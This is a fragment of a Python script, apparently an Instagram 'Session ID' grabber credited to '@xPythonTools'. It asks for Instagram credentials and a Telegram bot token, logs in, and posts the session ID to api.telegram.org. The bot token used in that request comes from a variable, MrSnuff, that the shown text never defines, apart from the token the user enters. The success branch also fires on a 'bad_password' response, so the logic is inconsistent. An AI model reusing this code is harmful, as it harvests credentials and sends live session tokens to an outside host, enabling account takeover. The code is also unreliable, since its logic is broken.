...
RED = '\x1b[1;91m'
Zryko = '\x1b[38;5;120m'
Satanzryko = '\x1b[38;5;204m'
Six66 = '\x1b[1;96m'
#-----------------------------------#

print(Six66+'\n')
print('━'*55)
print(RED+'\n        To Make Season ID You Need a Instagram Account With Password  \n ⚠️ I Prefer Use a Fake Account')
print(Six66+'\n')
print('━'*55)
ZryKo=input(Zryko+'\n\n BOT TOKEN : ');Satan=input(Satanzryko+' YOUR ID : ')
print(Six66+'\n')
print('━'*55)
user=input(Zryko+'\n\nInstagram Username : ');pas=input(Satanzryko+' \nInstagram Password : ')
...
def login():
    ...
    if ('"bad_password"') in re.text:
        ...
        print('Session ID Sended On Your Bot \n\n[✓] SessionID : ',sessoin)
        Flick_Tools = f'''𝖲𝖠𝖳𝖠𝖭 𝖲𝖾𝗇𝖽 𝖸𝗈𝗎𝗋 𝖲𝖾𝖺𝗌𝗈𝗇 𝖨𝖣 

 𝖲𝖾𝗌𝗌𝗂𝗈𝗇𝖨𝖣 : {sessoin} 

 𝖡𝗒 : @xPythonTools'''
        requests.post(f"https://api.telegram.org/bot{MrSnuff}/sendMessage?chat_id={Satan}&text={Flick_Tools}")
    
    else:
        data7 = {'Login Fail ':'Please Check User & Pass '}
        print(data7)
login()
